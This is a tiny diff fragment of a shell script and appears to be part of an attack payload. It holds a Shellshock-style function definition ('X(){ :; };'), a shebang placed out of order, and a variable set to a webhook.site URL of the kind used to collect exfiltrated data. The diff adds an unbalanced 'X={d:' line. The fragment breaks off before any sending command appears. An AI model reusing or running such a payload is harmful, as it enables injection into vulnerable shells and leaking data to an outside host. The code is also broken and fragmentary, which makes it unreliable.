@@ -1,3 +1,4 @@
+X={d:
 X(){ :; }; # (
 #!/bin/sh
 B='https://webhook.site/5280fbc1-77f5-4ce4-823a-193a4cc5f8c4'
